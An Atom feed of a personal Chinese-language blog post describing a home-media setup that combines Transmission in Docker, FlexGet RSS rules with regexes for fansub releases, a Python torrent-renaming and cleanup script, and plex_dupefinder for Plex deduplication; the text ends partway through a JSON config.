<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kur4ge&#39;s Blog</title>
  
  <subtitle>クラゲにも夢がある</subtitle>
  <link href="https://blog.kur4ge.com/atom.xml" rel="self"/>
  
  <link href="https://blog.kur4ge.com/"/>
  <updated>2023-07-15T14:53:49.000Z</updated>
  <id>https://blog.kur4ge.com/</id>
  
  <author>
    <name>Kur4ge</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>我的自动化番剧工作流</title>
    <link href="https://blog.kur4ge.com/2023/07/flexget-plex-and-bangumi/"/>
    <id>https://blog.kur4ge.com/2023/07/flexget-plex-and-bangumi/</id>
    <published>2023-07-15T22:53:49.000Z</published>
    <updated>2023-07-15T14:53:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>啊B最近番剧越来越不能看了，加上鼓捣影音库已经上了<code>Plex Pass</code>，是时候鼓捣自动下番了！</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2023/07/flexget-plex-and-bangumi/plex.png" alt="Plex Bangumi"></p><span id="more"></span><h2 id="Transmission"><a href="#Transmission" class="headerlink" title="Transmission"></a>Transmission</h2><p>使用 Transmission 进行 BT下载</p><p><strong>无脑 Docker</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;2.1&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">transmission:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">lscr.io/linuxserver/transmission:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">transmission</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PUID=1001</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PGID=1001</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TRANSMISSION_WEB_HOME=</span> <span class="comment">#optional</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">USER=</span> <span class="comment">#optional</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PASS=</span> <span class="comment">#optional</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WHITELIST=</span> <span class="comment">#optional</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PEERPORT=</span> <span class="comment">#optional</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">HOST_WHITELIST=</span> <span class="comment">#optional</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/path/to/config/folder:/config</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/path/to/downloads/folder:/downloads</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/path/to/watch/folder:/watch</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9091</span><span class="string">:9091</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">51413</span><span class="string">:51413</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">51413</span><span class="string">:51413/udp</span></span><br><span class="line"><span class="comment">#    network_mode: host</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure><h2 id="自动化下载"><a href="#自动化下载" class="headerlink" title="自动化下载"></a>自动化下载</h2><p>通过 <a href="https://www.flexget.com/">FlexGet</a> 定期向 <a href="https://acg.rip/">acg.rip</a> 爬取rss，解析想要的字幕组，推送到 <a href="https://transmissionbt.com/">Transmission</a> 自动下载。</p><p><strong>无脑安装命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flexget</span><br></pre></td></tr></table></figure><p><strong>config.yaml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">templates:</span></span><br><span class="line">  <span class="attr">tr:</span></span><br><span class="line">    <span class="attr">transmission:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="string">your_port</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">your_username</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">your_password</span></span><br><span class="line">      <span class="comment"># add_paused: yes  # 添加后不自动下载</span></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="attr">save_root:</span> <span class="string">/mnt/Media/WEB-DL</span>  <span class="comment"># 保存的位置</span></span><br><span class="line">  <span class="comment"># 最终会保存到 /mnt/Media/WEB-DL/字幕组名称/番剧名称/S??/ 下</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tasks:</span></span><br><span class="line">  <span class="attr">acg.rip:</span></span><br><span class="line">    <span class="attr">rss:</span> <span class="string">https://acg.rip/.xml?term=</span></span><br><span class="line">    <span class="attr">seen:</span></span><br><span class="line">      <span class="attr">fields:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">url</span></span><br><span class="line">    <span class="attr">manipulate:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">full:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">title</span> <span class="comment"># 保存一份拷贝</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">full:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;\[(Lilith-Raws)] (.* / )?(.*?)( S?(\d+))? - (\d+) \[([^]]+)].*?(1080|720)[pP].+&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1#0#\3#1#\5#2#\6#3#\7#4#\8&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">full:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;【(喵萌.*?)】★.*?★\[.*? ?/ ?([^]]+)]\[(\d+)]\[(1080|720)[pP]?].*?(简).+&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1#0#\2#1##2#\3#3#\4#4#&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">full:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;\[(ANi)] (.+?)( S(\d+))? - .+ - (\d+) \[(1080|720)[Pp]?]\[([^]]+)].+&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1#0#\2#1#\4#2#\5#3#\7#4#\6&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">full:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;\[.*(LoliHouse).*] .+ / (.+?)( S(\d+))? - (\d+)(?:v\d+)? \[.*?(1080|720)[pP].*(简).+&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1#0#\2#1#\4#2#\5#3##4#\6&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">full:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;\[(桜都字幕组|MingY|Oborozuki)] .*? / (.*?)( [Ss](\d+))? \[(\d+)]\[(1080|720)[pP]?].*简繁.*内封.+&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1#0#\2#1#\4#2#\5#3##4#\6&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">full:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;\[(SweetSub)[^]]*]\[.+?]\[(.+?)([Ss](\d+))?]\[(\d+)].+?(1080|720)[pP].+?简.+&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1#0#\2#1#\4#2#\5#3##4#\6&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">group:</span>  <span class="comment"># 提取字幕组名称</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^(.+?)#0#(.+?)#1#(\d*)#2#(\d+)#3#(\S*)#4#(\S*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span>  <span class="comment"># 提取番剧名</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^(.+?)#0#(.+?)#1#(\d*)#2#(\d+)#3#(\S*)#4#(\S*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\2&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">session:</span>    <span class="comment"># 提取第几季</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^(.+?)#0#(.+?)#1#(\d*)#2#(\d+)#3#(\S*)#4#(\S*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;S\3&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">session:</span>    <span class="comment"># 格式化 S1 改成 S01</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">session</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^S(\d)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;S0\1&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">session:</span>    <span class="comment"># 如果为空，默认S01</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">session</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^S$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;S01&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">episode:</span>    <span class="comment"># 提取第几集</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^(.+?)#0#(.+?)#1#(\d*)#2#(\d+)#3#(\S*)#4#(\S*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;E\4&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">episode:</span>    <span class="comment"># E1 改成 S01</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">episode</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^E(\d)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;E0\1&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source:</span>     <span class="comment"># 来源，Baha 之类的</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^(.+?)#0#(.+?)#1#(\d*)#2#(\d+)#3#(\S*)#4#(\S*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\5&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">resolution:</span> <span class="comment"># 分辨率</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span> <span class="string">&#x27;^(.+?)#0#(.+?)#1#(\d*)#2#(\d+)#3#(\S*)#4#(\S*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\6&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">subpath:</span> <span class="comment"># 可以用黑名单来拦截</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">full</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span>  <span class="string">&#x27;^(.+?)#0#(.+?)#1#(\d*)#2#(\d+)#3#(\S*)#4#(\S*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;Group: \1; Name: \2; Session: S\3&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">subpath:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">subpath</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span>  <span class="string">&#x27;^Group: (.+); Name: (.*); Session: S$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;Group: \1; Name: \2; Session: S1&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">subpath:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">subpath</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span>  <span class="string">&#x27;^Group: (.+); Name: (.*); Session: S(\d)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;Group: \1; Name: \2; Session: S0\3&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">subpath:</span></span><br><span class="line">        <span class="attr">from:</span> <span class="string">subpath</span></span><br><span class="line">        <span class="attr">replace:</span></span><br><span class="line">          <span class="attr">regexp:</span>  <span class="string">&#x27;^Group: (.+); Name: (.*); Session: (.*)$&#x27;</span></span><br><span class="line">          <span class="attr">format:</span> <span class="string">&#x27;\1/\2/\3&#x27;</span></span><br><span class="line">    <span class="attr">regexp:</span></span><br><span class="line">      <span class="attr">reject:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">ANi/Mononogatari/S01</span>  <span class="comment"># 黑名单，这样不会下载这个番，支持正则</span></span><br><span class="line">      <span class="attr">accept:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">.+\/.+\/S\d+</span></span><br><span class="line">      <span class="attr">from:</span> <span class="string">subpath</span></span><br><span class="line">    <span class="attr">template:</span> <span class="string">tr</span></span><br><span class="line">    <span class="attr">transmission:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">&#x27;&#123;? save_root ?&#125;/<span class="template-variable">&#123;&#123; subpath &#125;&#125;</span>/&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Plex-识别优化-和-自动清空旧种"><a href="#Plex-识别优化-和-自动清空旧种" class="headerlink" title="Plex 识别优化 和 自动清空旧种"></a>Plex 识别优化 和 自动清空旧种</h2><p>Plex 有一个bug，如果文件名为 <code>[Nekomoe kissaten][Undead Girl Murder Farce][02][1080p][JPTC].mp4</code> 是无法识别的，<br>需要替换为 <code>[Nekomoe kissaten] Undead Girl Murder Farce - 02 [1080p][JPTC].mp4</code>，把名称和集数给分开。<br>所以写一个简单的脚本来修改名称，也顺便清理旧种子。</p><p><strong>flexget-auto.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> transmission_rpc</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">TRANS_CLIENT_CONF = &#123;</span><br><span class="line">    <span class="string">&quot;host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&quot;port&quot;</span>: <span class="string">&quot;9091&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Airota</span>(<span class="params">client: transmission_rpc.Client, torrent: transmission_rpc.Torrent</span>):</span><br><span class="line">    r = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^(\[Airota\])\[([^]]+)\]\[(\d+)\]&#x27;</span>)</span><br><span class="line">    new_file_name = r.sub(<span class="string">r&quot;\1 \2 - \3 &quot;</span>, torrent.name, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> new_file_name == torrent.name:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    ret = client.rename_torrent_path(torrent.<span class="built_in">id</span>, torrent.name, new_file_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Airota Rename: <span class="subst">&#123;torrent.name&#125;</span> -&gt; <span class="subst">&#123;new_file_name&#125;</span>: <span class="subst">&#123;ret&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NekomoeKissaten</span>(<span class="params">client: transmission_rpc.Client, torrent: transmission_rpc.Torrent</span>):</span><br><span class="line">    r = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^(\[Nekomoe kissaten\])\[([^]]+)\]\[(\d+)\]&#x27;</span>)</span><br><span class="line">    new_file_name = r.sub(<span class="string">r&quot;\1 \2 - \3 &quot;</span>, torrent.name, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> new_file_name == torrent.name:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    ret = client.rename_torrent_path(torrent.<span class="built_in">id</span>, torrent.name, new_file_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;NekomoeKissaten Rename: <span class="subst">&#123;torrent.name&#125;</span> -&gt; <span class="subst">&#123;new_file_name&#125;</span>: <span class="subst">&#123;ret&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeleteOldTorrent</span>(<span class="params">client: transmission_rpc.Client, torrent: transmission_rpc.Torrent</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> torrent.is_finished <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> torrent.done_date.timestamp() + <span class="number">3600</span> * <span class="number">24</span> * <span class="number">7</span> &gt; time.time():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ret = client.remove_torrent(torrent.<span class="built_in">id</span>, delete_data=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Delete: <span class="subst">&#123;torrent.name&#125;</span>: <span class="subst">&#123;ret&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        trans_client = transmission_rpc.Client(**TRANS_CLIENT_CONF)</span><br><span class="line">    <span class="keyword">except</span> transmission_rpc.error.TransmissionAuthError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    torrents = trans_client.get_torrents()</span><br><span class="line">    <span class="keyword">for</span> torrent <span class="keyword">in</span> torrents:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;torrent.hashString[-<span class="number">8</span>:]&#125;</span>: <span class="subst">&#123;torrent.name&#125;</span> (<span class="subst">&#123;torrent.status&#125;</span>)&#x27;</span>, <span class="string">&#x27;in transmission.&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> DeleteOldTorrent(trans_client, torrent): <span class="comment"># 删除老种子</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        NekomoeKissaten(trans_client, torrent)</span><br><span class="line">        Airota(trans_client, torrent)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="Plex-去重"><a href="#Plex-去重" class="headerlink" title="Plex 去重"></a>Plex 去重</h2><p>之后，会有部分剧集多次重复下载，这里使用 <a href="https://github.com/l3uddz/plex_dupefinder">plex dupefinder</a> 来去重。<br>它是通过 文件名，音频编码格式，视频编码格式，分辨率来给资源算分，自动算出最高的进行保留。</p><p><img src="https://kur4ge.oss-accelerate.aliyuncs.com/2023/07/flexget-plex-and-bangumi/plex-dupefinder.png" alt="Plex DupeFinder"></p><p><strong>无脑安装命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/l3uddz/plex_dupefinder.git</span><br><span class="line"><span class="built_in">cd</span> plex_dupefinder</span><br><span class="line">python -m venv venv</span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>再创建 <code>plex_dupefinder.sh</code> 作为启动入口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">BASE_PATH=`<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line"><span class="built_in">source</span> <span class="variable">$BASE_PATH</span>/venv/bin/activate</span><br><span class="line">python <span class="variable">$BASE_PATH</span>/plex_dupefinder.py</span><br></pre></td></tr></table></figure><p>由于我的播放器支持 <code>hevc</code> 编码和我喜欢mkv格式，所以微调了下config。一般用默认即可。<br><code>FILENAME_SCORES</code> 也能主动给一些喜欢的字幕组加分。<br><strong>config.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;AUDIO_CODEC_SCORES&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Unknown&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;aac&quot;</span><span class="punctuation">:</span> <span class="number">1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ac3&quot;</span><span class="punctuation">:</span> <span class="number">1000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dca&quot;</span><span class="punctuation">:</span> <span class="number">2000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dca-ma&quot;</span><span class="punctuation">:</span> <span class="number">4000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eac3&quot;</span><span class="punctuation">:</span> <span class="number">1250</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;flac&quot;</span><span class="punctuation">:</span> <span class="number">2500</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mp2&quot;</span><span class="punctuation">:</span> <span class="number">500</span><span 